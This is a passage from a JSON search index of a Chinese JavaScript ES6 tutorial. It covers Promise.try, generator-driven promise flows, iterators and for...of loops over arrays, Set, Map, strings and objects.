\u51fd\u6570\u7ba1\u7406\u6d41\u7a0b\uff0c\u9047\u5230\u5f02\u6b65\u64cd\u4f5c\u7684\u65f6\u5019\uff0c\u901a\u5e38\u8fd4\u56de\u4e00\u4e2a<code>Promise</code>\u5bf9\u8c61\u3002</p> <pre><code>function getFoo () {\n  return new Promise(function (resolve, reject){\n    resolve('foo');\n  });\n}\n\nconst g = function* () {\n  try {\n    const foo = yield getFoo();\n    console.log(foo);\n  } catch (e) {\n    console.log(e);\n  }\n};\n\nfunction run (generator) {\n  const it = generator();\n\n  function go(result) {\n    if (result.done) return result.value;\n\n    return result.value.then(function (value) {\n      return go(it.next(value));\n    }, function (error) {\n      return go(it.throw(error));\n    });\n  }\n\n  go(it.next());\n}\n\nrun(g);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684 Generator \u51fd\u6570<code>g</code>\u4e4b\u4e2d\uff0c\u6709\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c<code>getFoo</code>\uff0c\u5b83\u8fd4\u56de\u7684\u5c31\u662f\u4e00\u4e2a<code>Promise</code>\u5bf9\u8c61\u3002\u51fd\u6570<code>run</code>\u7528\u6765\u5904\u7406\u8fd9\u4e2a<code>Promise</code>\u5bf9\u8c61\uff0c\u5e76\u8c03\u7528\u4e0b\u4e00\u4e2a<code>next</code>\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JSES6-RYF/16-Promise/#promisetry","title":"Promise.try()","text":"<p>\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u7ecf\u5e38\u9047\u5230\u4e00\u79cd\u60c5\u51b5\uff1a\u4e0d\u77e5\u9053\u6216\u8005\u4e0d\u60f3\u533a\u5206\uff0c\u51fd\u6570<code>f</code>\u662f\u540c\u6b65\u51fd\u6570\u8fd8\u662f\u5f02\u6b65\u64cd\u4f5c\uff0c\u4f46\u662f\u60f3\u7528 Promise \u6765\u5904\u7406\u5b83\u3002\u56e0\u4e3a\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e0d\u7ba1<code>f</code>\u662f\u5426\u5305\u542b\u5f02\u6b65\u64cd\u4f5c\uff0c\u90fd\u7528<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u4e0b\u4e00\u6b65\u6d41\u7a0b\uff0c\u7528<code>catch</code>\u65b9\u6cd5\u5904\u7406<code>f</code>\u629b\u51fa\u7684\u9519\u8bef\u3002\u4e00\u822c\u5c31\u4f1a\u91c7\u7528\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>Promise.resolve().then(f)\n</code></pre> <p>\u4e0a\u9762\u7684\u5199\u6cd5\u6709\u4e00\u4e2a\u7f3a\u70b9\uff0c\u5c31\u662f\u5982\u679c<code>f</code>\u662f\u540c\u6b65\u51fd\u6570\uff0c\u90a3\u4e48\u5b83\u4f1a\u5728\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u7684\u672b\u5c3e\u6267\u884c\u3002</p> <pre><code>const f = () =&gt; console.log('now');\nPromise.resolve().then(f);\nconsole.log('next');\n// next\n// now\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>f</code>\u662f\u540c\u6b65\u7684\uff0c\u4f46\u662f\u7528 Promise \u5305\u88c5\u4e86\u4ee5\u540e\uff0c\u5c31\u53d8\u6210\u5f02\u6b65\u6267\u884c\u4e86\u3002</p> <p>\u90a3\u4e48\u6709\u6ca1\u6709\u4e00\u79cd\u65b9\u6cd5\uff0c\u8ba9\u540c\u6b65\u51fd\u6570\u540c\u6b65\u6267\u884c\uff0c\u5f02\u6b65\u51fd\u6570\u5f02\u6b65\u6267\u884c\uff0c\u5e76\u4e14\u8ba9\u5b83\u4eec\u5177\u6709\u7edf\u4e00\u7684 API \u5462\uff1f\u56de\u7b54\u662f\u53ef\u4ee5\u7684\uff0c\u5e76\u4e14\u8fd8\u6709\u4e24\u79cd\u5199\u6cd5\u3002\u7b2c\u4e00\u79cd\u5199\u6cd5\u662f\u7528<code>async</code>\u51fd\u6570\u6765\u5199\u3002</p> <pre><code>const f = () =&gt; console.log('now');\n(async () =&gt; f())();\nconsole.log('next');\n// now\n// next\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u884c\u662f\u4e00\u4e2a\u7acb\u5373\u6267\u884c\u7684\u533f\u540d\u51fd\u6570\uff0c\u4f1a\u7acb\u5373\u6267\u884c\u91cc\u9762\u7684<code>async</code>\u51fd\u6570\uff0c\u56e0\u6b64\u5982\u679c<code>f</code>\u662f\u540c\u6b65\u7684\uff0c\u5c31\u4f1a\u5f97\u5230\u540c\u6b65\u7684\u7ed3\u679c\uff1b\u5982\u679c<code>f</code>\u662f\u5f02\u6b65\u7684\uff0c\u5c31\u53ef\u4ee5\u7528<code>then</code>\u6307\u5b9a\u4e0b\u4e00\u6b65\uff0c\u5c31\u50cf\u4e0b\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>(async () =&gt; f())()\n.then(...)\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c<code>async () =&gt; f()</code>\u4f1a\u5403\u6389<code>f()</code>\u629b\u51fa\u7684\u9519\u8bef\u3002\u6240\u4ee5\uff0c\u5982\u679c\u60f3\u6355\u83b7\u9519\u8bef\uff0c\u8981\u4f7f\u7528<code>promise.catch</code>\u65b9\u6cd5\u3002</p> <pre><code>(async () =&gt; f())()\n.then(...)\n.catch(...)\n</code></pre> <p>\u7b2c\u4e8c\u79cd\u5199\u6cd5\u662f\u4f7f\u7528<code>new Promise()</code>\u3002</p> <pre><code>const f = () =&gt; console.log('now');\n(\n  () =&gt; new Promise(\n    resolve =&gt; resolve(f())\n  )\n)();\nconsole.log('next');\n// now\n// next\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e5f\u662f\u4f7f\u7528\u7acb\u5373\u6267\u884c\u7684\u533f\u540d\u51fd\u6570\uff0c\u6267\u884c<code>new Promise()</code>\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u540c\u6b65\u51fd\u6570\u4e5f\u662f\u540c\u6b65\u6267\u884c\u7684\u3002</p> <p>\u9274\u4e8e\u8fd9\u662f\u4e00\u4e2a\u5f88\u5e38\u89c1\u7684\u9700\u6c42\uff0c\u6240\u4ee5\u73b0\u5728\u6709\u4e00\u4e2a\u63d0\u6848\uff0c\u63d0\u4f9b<code>Promise.try</code>\u65b9\u6cd5\u66ff\u4ee3\u4e0a\u9762\u7684\u5199\u6cd5\u3002</p> <pre><code>const f = () =&gt; console.log('now');\nPromise.try(f);\nconsole.log('next');\n// now\n// next\n</code></pre> <p>\u4e8b\u5b9e\u4e0a\uff0c<code>Promise.try</code>\u5b58\u5728\u5df2\u4e45\uff0cPromise \u5e93<code>Bluebird</code>\u3001<code>Q</code>\u548c<code>when</code>\uff0c\u65e9\u5c31\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u65b9\u6cd5\u3002</p> <p>\u7531\u4e8e<code>Promise.try</code>\u4e3a\u6240\u6709\u64cd\u4f5c\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u5904\u7406\u673a\u5236\uff0c\u6240\u4ee5\u5982\u679c\u60f3\u7528<code>then</code>\u65b9\u6cd5\u7ba1\u7406\u6d41\u7a0b\uff0c\u6700\u597d\u90fd\u7528<code>Promise.try</code>\u5305\u88c5\u4e00\u4e0b\u3002\u8fd9\u6837\u6709\u8bb8\u591a\u597d\u5904\uff0c\u5176\u4e2d\u4e00\u70b9\u5c31\u662f\u53ef\u4ee5\u66f4\u597d\u5730\u7ba1\u7406\u5f02\u5e38\u3002</p> <pre><code>function getUsername(userId) {\n  return database.users.get({id: userId})\n  .then(function(user) {\n    return user.name;\n  });\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>database.users.get()</code>\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u5982\u679c\u629b\u51fa\u5f02\u6b65\u9519\u8bef\uff0c\u53ef\u4ee5\u7528<code>catch</code>\u65b9\u6cd5\u6355\u83b7\uff0c\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\u5199\u3002</p> <pre><code>database.users.get({id: userId})\n.then(...)\n.catch(...)\n</code></pre> <p>\u4f46\u662f<code>database.users.get()</code>\u53ef\u80fd\u8fd8\u4f1a\u629b\u51fa\u540c\u6b65\u9519\u8bef\uff08\u6bd4\u5982\u6570\u636e\u5e93\u8fde\u63a5\u9519\u8bef\uff0c\u5177\u4f53\u8981\u770b\u5b9e\u73b0\u65b9\u6cd5\uff09\uff0c\u8fd9\u65f6\u4f60\u5c31\u4e0d\u5f97\u4e0d\u7528<code>try...catch</code>\u53bb\u6355\u83b7\u3002</p> <pre><code>try {\n  database.users.get({id: userId})\n  .then(...)\n  .catch(...)\n} catch (e) {\n  // ...\n}\n</code></pre> <p>\u4e0a\u9762\u8fd9\u6837\u7684\u5199\u6cd5\u5c31\u5f88\u7b28\u62d9\u4e86\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u7edf\u4e00\u7528<code>promise.catch()</code>\u6355\u83b7\u6240\u6709\u540c\u6b65\u548c\u5f02\u6b65\u7684\u9519\u8bef\u3002</p> <pre><code>Promise.try(() =&gt; database.users.get({id: userId}))\n  .then(...)\n  .catch(...)\n</code></pre> <p>\u4e8b\u5b9e\u4e0a\uff0c<code>Promise.try</code>\u5c31\u662f\u6a21\u62df<code>try</code>\u4ee3\u7801\u5757\uff0c\u5c31\u50cf<code>promise.catch</code>\u6a21\u62df\u7684\u662f<code>catch</code>\u4ee3\u7801\u5757\u3002</p>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/","title":"17 \u904d\u5386\u5668\u7684\u5faa\u73af","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 9813  \u9605\u8bfb20\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#_1","title":"\u904d\u5386\u5668","text":"<p>Iterator \u904d\u5386\u5668\uff0c\u8868\u793a\u201c\u96c6\u5408\u201d\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4e3b\u8981\u662f array map set\u3002Iterator \u662f\u8fd9\u56db\u4e2a\u96c6\u5408\u6570\u636e\u7ed3\u6784\u7684\u516c\u5171\u63a5\u53e3\u3002\u53ef\u4ee5\u4f7f\u7528 for-of \u5faa\u73af\u904d\u5386\u8fd9\u56db\u4e2a\u7c7b\u578b\u3002</p> <p>for-of \u904d\u5386\u539f\u7406\uff1aIterator\u4f1a\u521b\u5efa\u4e00\u4e2a\u6307\u9488\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u5177\u6709next\u7684\u65b9\u6cd5\u548cdone\u7684\u5c5e\u6027\u3002\u904d\u5386\u8fc7\u7a0b\u4e2d\u4e0d\u65ad\u8c03\u7528next\uff0c\u6307\u5411\u540e\u9762\u4e00\u4e2a\u9879\uff0cnone\u8868\u793a\u540e\u9762\u662f\u5426\u6709\u591a\u4f59\u7684\u9879\u3002</p> <pre><code>function makeIterator(array) {\n  let nextIndex = 0;\n  return {\n    next: function() {\n      return nextIndex &lt; array.length ? {value:array[nextIndex++]} : {done: true};\n    }\n  };\n}\n</code></pre> <p>\u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u53ef\u904d\u5386\uff08itarable\uff09\u5177\u6709 Symbol.iterator \u5c5e\u6027\u3002\u5177\u6709\u904d\u5386\u5c5e\u6027\u7684\u662f\uff1aArray, Map, Set, String, TypedArray, arguments,nodeList\u3002\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 for-of \u5faa\u73af\u904d\u5386\uff0c\u904d\u5386\u7ed3\u679c\u7684\u987a\u5e8f\u662f\u786e\u5b9a\u7684\u3002</p> <pre><code>let iterable = {\n  0: 'a',\n  1: 'b',\n  length: 2,\n  [Symbol.iterator]: Array.prototype[Symbol.iterator]\n};\nfor (let item of iterable) {\n  console.log(item);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#_2","title":"\u4f7f\u7528","text":"<ol> <li> <p>for...of... \u5faa\u73af</p> </li> <li> <p>\u89e3\u6784\u8d4b\u503c\u548c\u6269\u5c55\u8fd0\u7b97\u7b26</p> </li> </ol> <p>\u53ea\u8981\u90e8\u7f72\u4e86\u904d\u5386\u5668\u7684\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u89e3\u6784\u8d4b\u503c\u548c\u6269\u5c55\u8fd0\u7b97\u7b26</p> <pre><code>let set = new Set();\nset.add('a').add('b').add('c');\nlet [x, y] = set;\n// x =&gt; a y =&gt; b\nlet [first, ...rest] = set;\n// first =&gt; a, rest =&gt; [b, c]\n\nlet atr = 'hi';\n[...str] // ['h', 'i']\n\nlet arr2 = ['b', 'c'];\nlet arr3 = ['a', ...arr2, 'd'];\n</code></pre> <ol> <li>\u6784\u9020\u5668\u51fd\u6570</li> </ol> <pre><code>let generator = function* () {\n  yield 1;\n  yield* [2, 3, 4];\n  yield 5;\n};\nlet iterator = generator();\niterator.next() // { value: 1, done: false }\n</code></pre> <ol> <li>\u5176\u4ed6\u4f7f\u7528    Array.from()    Map(), Set(), WeakMap(), WeakSet()\uff08\u6bd4\u5982new Map([['a',1],['b',2]])\uff09    Promise.all()    Promise.race()</li> </ol>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#generator","title":"Generator \u51fd\u6570","text":"<p><code>Symbol.iterator</code>\u65b9\u6cd5\u7684\u6700\u7b80\u5355\u5b9e\u73b0</p> <pre><code>let myIterable = {\n  [Symbol.iterator]: function* () {\n    yield 1;\n    yield 2;\n    yield 3;\n  }\n}\n[...myIterable] // [1, 2, 3]\n\n// \u6216\u8005\u4e0b\u9762\u7684\u7b80\u6d01\u5199\u6cd5\nlet obj = {\n  * [Symbol.iterator]() {\n    yield: 'hello';\n    yield: 'world';\n  }\n};\nfor (let i in obj) {\n  console.log(i)\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Symbol.iterator</code>\u65b9\u6cd5\u51e0\u4e4e\u4e0d\u7528\u90e8\u7f72\u4efb\u4f55\u4ee3\u7801\uff0c\u53ea\u8981\u7528 yield \u547d\u4ee4\u7ed9\u51fa\u6bcf\u4e00\u6b65\u7684\u8fd4\u56de\u503c\u5373\u53ef\u3002</p>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#forof","title":"for...of","text":"<p>ES6 \u5f15\u5165\u4e86<code>for...of</code>\u5faa\u73af\uff0c\u4f5c\u4e3a\u904d\u5386\u6240\u6709\u6570\u636e\u7ed3\u6784\u7684\u7edf\u4e00\u7684\u65b9\u6cd5\u3002\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\u53ea\u8981\u90e8\u7f72\u4e86<code>Symbol.iterator</code>\u5c5e\u6027\uff0c\u5c31\u88ab\u89c6\u4e3a\u5177\u6709 iterator \u63a5\u53e3\uff0c\u5c31\u53ef\u4ee5\u7528<code>for...of</code>\u5faa\u73af\u904d\u5386\u5b83\u7684\u6210\u5458\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c<code>for...of</code>\u5faa\u73af\u5185\u90e8\u8c03\u7528\u7684\u662f\u6570\u636e\u7ed3\u6784\u7684<code>Symbol.iterator</code>\u65b9\u6cd5\u3002</p> <p><code>for...of</code>\u5faa\u73af\u53ef\u4ee5\u4f7f\u7528\u7684\u8303\u56f4\u5305\u62ec\u6570\u7ec4\u3001Set \u548c Map \u7ed3\u6784\u3001\u67d0\u4e9b\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08\u6bd4\u5982<code>arguments</code>\u5bf9\u8c61\u3001DOM NodeList \u5bf9\u8c61\uff09\u3001\u540e\u6587\u7684 Generator \u5bf9\u8c61\uff0c\u4ee5\u53ca\u5b57\u7b26\u4e32\u3002</p>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#_3","title":"\u6570\u7ec4","text":"<p>\u53ef\u4ee5\u904d\u5386\u83b7\u53d6\u6570\u7ec4\u7684\u6bcf\u4e00\u9879</p> <p>\u6570\u7ec4\u539f\u751f\u5177\u5907<code>iterator</code>\u63a5\u53e3\uff08\u5373\u9ed8\u8ba4\u90e8\u7f72\u4e86<code>Symbol.iterator</code>\u5c5e\u6027\uff09\uff0c<code>for...of</code>\u5faa\u73af\u672c\u8d28\u4e0a\u5c31\u662f\u8c03\u7528\u8fd9\u4e2a\u63a5\u53e3\u4ea7\u751f\u7684\u904d\u5386\u5668\u3002</p> <pre><code>const arr = ['red', 'green', 'blue'];\nfor(let v of arr) {\n  console.log(v);\n}\n</code></pre> <p><code>for...of</code>\u5faa\u73af\u53ef\u4ee5\u4ee3\u66ff\u6570\u7ec4\u5b9e\u4f8b\u7684<code>forEach</code>\u65b9\u6cd5\u3002</p> <pre><code>const arr = ['red', 'green', 'blue'];\narr.forEach(function (element, index) {\n  console.log(element); // red green blue\n  console.log(index);   // 0 1 2\n});\n</code></pre> <p>JavaScript \u539f\u6709\u7684<code>for...in</code>\u5faa\u73af\uff0c\u53ea\u80fd\u83b7\u5f97\u5bf9\u8c61\u7684\u952e\u540d\uff0c\u4e0d\u80fd\u76f4\u63a5\u83b7\u53d6\u952e\u503c\u3002ES6 \u63d0\u4f9b<code>for...of</code>\u5faa\u73af\uff0c\u5141\u8bb8\u904d\u5386\u83b7\u5f97\u952e\u503c\u3002</p> <pre><code>var arr = ['a', 'b', 'c', 'd'];\nfor (let a of arr) {\n  console.log(a); // a b c d\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u660e\uff0c<code>for...in</code>\u5faa\u73af\u8bfb\u53d6\u952e\u540d\uff0c<code>for...of</code>\u5faa\u73af\u8bfb\u53d6\u952e\u503c\u3002\u5982\u679c\u8981\u901a\u8fc7<code>for...of</code>\u5faa\u73af\uff0c\u83b7\u53d6\u6570\u7ec4\u7684\u7d22\u5f15\uff0c\u53ef\u4ee5\u501f\u52a9\u6570\u7ec4\u5b9e\u4f8b\u7684<code>entries</code>\u65b9\u6cd5\u548c<code>keys</code>\u65b9\u6cd5\u3002</p> <p><code>for...of</code>\u5faa\u73af\u8c03\u7528\u904d\u5386\u5668\u63a5\u53e3\uff0c\u6570\u7ec4\u7684\u904d\u5386\u5668\u63a5\u53e3\u53ea\u8fd4\u56de\u5177\u6709\u6570\u5b57\u7d22\u5f15\u7684\u5c5e\u6027\u3002\u8fd9\u4e00\u70b9\u8ddf<code>for...in</code>\u5faa\u73af\u4e5f\u4e0d\u4e00\u6837\u3002</p> <pre><code>let arr = [3, 5, 7];\narr.foo = 'hello';\n\nfor (let i in arr) {\n  console.log(i); // \"0\", \"1\", \"2\", \"foo\"\n}\nfor (let i of arr) {\n  console.log(i); //  \"3\", \"5\", \"7\"\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>for...of</code>\u5faa\u73af\u4e0d\u4f1a\u8fd4\u56de\u6570\u7ec4<code>arr</code>\u7684<code>foo</code>\u5c5e\u6027\u3002</p>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#set-map","title":"Set \u548c Map","text":"<p>Set \u548c Map \u7ed3\u6784\u4e5f\u539f\u751f\u5177\u6709 Iterator \u63a5\u53e3\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528<code>for...of</code>\u5faa\u73af\u3002</p> <pre><code>var engines = new Set([\"Gecko\", \"Trident\", \"Webkit\", \"Webkit\"]);\nfor (var e of engines) {\n  console.log(e);\n}\n\nvar es6 = new Map();\nes6.set(\"edition\", 6);\nes6.set(\"committee\", \"TC39\");\nes6.set(\"standard\", \"ECMA-262\");\nfor (var [name, value] of es6) {\n  console.log(name + \": \" + value);\n}\n</code></pre> <p>\u9996\u5148\uff0c\u904d\u5386\u7684\u987a\u5e8f\u662f\u6309\u7167\u5404\u4e2a\u6210\u5458\u88ab\u6dfb\u52a0\u8fdb\u6570\u636e\u7ed3\u6784\u7684\u987a\u5e8f\u3002\u5176\u6b21\uff0cSet \u7ed3\u6784\u904d\u5386\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u503c\uff0c\u800c Map \u7ed3\u6784\u904d\u5386\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u8be5\u6570\u7ec4\u7684\u4e24\u4e2a\u6210\u5458\u5206\u522b\u4e3a\u5f53\u524d Map \u6210\u5458\u7684\u952e\u540d\u548c\u952e\u503c\u3002</p> <pre><code>let map = new Map().set('a', 1).set('b', 2);\nfor (let pair of map) {\n  console.log(pair);\n}\n// ['a', 1]\n// ['b', 2]\n\nfor (let [key, value] of map) {\n  console.log(key + ' : ' + value);\n}\n// a : 1\n// b : 2\n</code></pre>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#_4","title":"\u53c2\u6570\u65b9\u6cd5","text":"<p>\u6709\u4e9b\u6570\u636e\u7ed3\u6784\u662f\u5728\u73b0\u6709\u6570\u636e\u7ed3\u6784\u7684\u57fa\u7840\u4e0a\uff0c\u8ba1\u7b97\u751f\u6210\u7684\u3002\u6bd4\u5982\uff0cES6 \u7684\u6570\u7ec4\u3001Set\u3001Map \u90fd\u90e8\u7f72\u4e86\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u6cd5\uff0c\u8c03\u7528\u540e\u90fd\u8fd4\u56de\u904d\u5386\u5668\u5bf9\u8c61\u3002</p> <ul> <li><code>entries()</code> \u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386<code>[\u952e\u540d, \u952e\u503c]</code>\u7ec4\u6210\u7684\u6570\u7ec4\u3002\u5bf9\u4e8e\u6570\u7ec4\uff0c\u952e\u540d\u5c31\u662f\u7d22\u5f15\u503c\uff1b\u5bf9\u4e8e Set\uff0c\u952e\u540d\u4e0e\u952e\u503c\u76f8\u540c\u3002Map \u7ed3\u6784\u7684 Iterator \u63a5\u53e3\uff0c\u9ed8\u8ba4\u5c31\u662f\u8c03\u7528<code>entries</code>\u65b9\u6cd5\u3002</li> <li><code>keys()</code> \u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386\u6240\u6709\u7684\u952e\u540d\u3002</li> <li><code>values()</code> \u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u6765\u904d\u5386\u6240\u6709\u7684\u952e\u503c\u3002</li> </ul> <p>\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u8c03\u7528\u540e\u751f\u6210\u7684\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u6240\u904d\u5386\u7684\u90fd\u662f\u8ba1\u7b97\u751f\u6210\u7684\u6570\u636e\u7ed3\u6784\u3002</p> <pre><code>let arr = ['a', 'b', 'c'];\nfor (let pair of arr.entries()) {\n  console.log(pair);\n}\n// [0, 'a']\n// [1, 'b']\n// [2, 'c']\n</code></pre>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#_5","title":"\u4f2a\u6570\u7ec4\u548c\u5b57\u7b26\u4e32","text":"<p>\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u5305\u62ec\u597d\u51e0\u7c7b\u3002\u4e0b\u9762\u662f<code>for...of</code>\u5faa\u73af\u7528\u4e8e\u5b57\u7b26\u4e32\u3001DOM NodeList \u5bf9\u8c61\u3001<code>arguments</code>\u5bf9\u8c61\u7684\u4f8b\u5b50\u3002</p> <pre><code>// \u5b57\u7b26\u4e32\nlet str = \"hello\";\nfor (let s of str) {\n  console.log(s); // h e l l o\n}\n\n// DOM NodeList\u5bf9\u8c61\nlet paras = document.querySelectorAll(\"p\");\nfor (let p of paras) {\n  p.classList.add(\"test\");\n}\n\n// arguments\u5bf9\u8c61\nfunction printArgs() {\n  for (let x of arguments) {\n    console.log(x);\n  }\n}\nprintArgs('a', 'b');\n// 'a'\n// 'b'\n</code></pre> <p>\u5bf9\u4e8e\u5b57\u7b26\u4e32\u6765\u8bf4\uff0c<code>for...of</code>\u5faa\u73af\u8fd8\u6709\u4e00\u4e2a\u7279\u70b9\uff0c\u5c31\u662f\u4f1a\u6b63\u786e\u8bc6\u522b 32 \u4f4d UTF-16 \u5b57\u7b26\u3002</p> <pre><code>for (let x of 'a\\uD83D\\uDC0A') {\n  console.log(x);\n}\n// 'a'\n// '\\uD83D\\uDC0A'\n</code></pre> <p>\u5e76\u4e0d\u662f\u6240\u6709\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u90fd\u5177\u6709 Iterator \u63a5\u53e3\uff0c\u89e3\u51b3\u65b9\u6cd5\uff0c\u5c31\u662f\u4f7f\u7528<code>Array.from</code>\u65b9\u6cd5\u5c06\u5176\u8f6c\u4e3a\u6570\u7ec4\u3002</p> <pre><code>let arrayLike = { length: 2, 0: 'a', 1: 'b' };\n\n// \u62a5\u9519\nfor (let x of arrayLike) {\n  console.log(x);\n}\n\n// \u6b63\u786e\nfor (let x of Array.from(arrayLike)) {\n  console.log(x);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#_6","title":"\u5bf9\u8c61","text":"<p>\u5bf9\u4e8e\u666e\u901a\u7684\u5bf9\u8c61\uff0c<code>for...of</code>\u7ed3\u6784\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\uff0c\u4f1a\u62a5\u9519\uff0c\u5fc5\u987b\u90e8\u7f72\u4e86 Iterator \u63a5\u53e3\u540e\u624d\u80fd\u4f7f\u7528\u3002\u4f46\u662f\uff0c\u8fd9\u6837\u60c5\u51b5\u4e0b\uff0c<code>for...in</code>\u5faa\u73af\u4f9d\u7136\u53ef\u4ee5\u7528\u6765\u904d\u5386\u952e\u540d\u3002</p> <pre><code>let es6 = {\n  edition: 6,\n  committee: \"TC39\",\n  standard: \"ECMA-262\"\n};\n\nfor (let e in es6) {\n  console.log(e);\n}\n// edition\n// committee\n// standard\n\nfor (let e of es6) {\n  console.log(e);\n}\n// TypeError: es6[Symbol.iterator] is not a function\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5bf9\u4e8e==\u666e\u901a\u7684\u5bf9\u8c61==\uff0c<code>for...in</code>\u5faa\u73af\u53ef\u4ee5\u904d\u5386\u952e\u540d\uff0c<code>for...of</code>\u5faa\u73af\u4f1a\u62a5\u9519\u3002</p> <p>\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\uff0c\u4f7f\u7528<code>Object.keys</code>\u65b9\u6cd5\u5c06\u5bf9\u8c61\u7684\u952e\u540d\u751f\u6210\u4e00\u4e2a\u6570\u7ec4\uff0c\u7136\u540e\u904d\u5386\u8fd9\u4e2a\u6570\u7ec4\u3002</p> <pre><code>for (let key of Object.keys(obj)) {\n  console.log(key)\n  console.log(obj[key])\n}\n\nfor (let key of Object.keys(obj)) {\n  console.log(key);\n}\n</code></pre> <p>\u53e6\u4e00\u4e2a\u65b9\u6cd5\u662f\u4f7f\u7528 Generator \u51fd\u6570\u5c06\u5bf9\u8c61\u91cd\u65b0\u5305\u88c5\u4e00\u4e0b\u3002</p> <pre><code>function* entries(obj) {\n  for (let key of Object.keys(obj)) {\n    yield [key, obj[key]];\n  }\n}\nfor (let [key, value] of entries(obj)) {\n  console.log(key, value);\n}\n\nfunction* entries(obj) {\n  for (let key of Object.keys(obj)) {\n    yield [key, obj[key]];\n  }\n}\nfor (let [key, value] of entries(obj)) {\n  console.log(key, value);\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/17-%E9%81%8D%E5%8E%86%E5%99%A8%E7%9A%84%E5%BE%AA%E7%8E%AF/#_7","title":"\u4e0e\u5176\u4ed6\u904d\u5386\u6bd4\u8f83","text":"<p>\u4ee5\u6570\u7ec4\u4e3a\u4f8b\uff0cJavaScript \u63d0\u4f9b\u591a\u79cd\u904d\u5386\u8bed\u6cd5\u3002</p> <p>1\u3001for</p> <pre><code>for (var index = 0; index &lt; arr.length; index++) {\n  console.log(arr[index]);\n}\n</code></pre> <p>2\u3001\u7b80\u5355\u65b9\u6cd5\uff1a<code>forEach</code>\u65b9\u6cd5\u3002\u95ee\u9898\uff0c\u65e0\u6cd5\u4e2d\u9014\u8df3\u51fa<code>forEach</code>\u5faa\u73af\uff0c<code>break</code>\u547d\u4ee4\u6216<code>return</code>\u547d\u4ee4\u90fd\u4e0d\u80fd\u594f\u6548\u3002</p> <pre><code>myArray.forEach(function (value) {\n  console.log(value);\n});\n</code></pre> 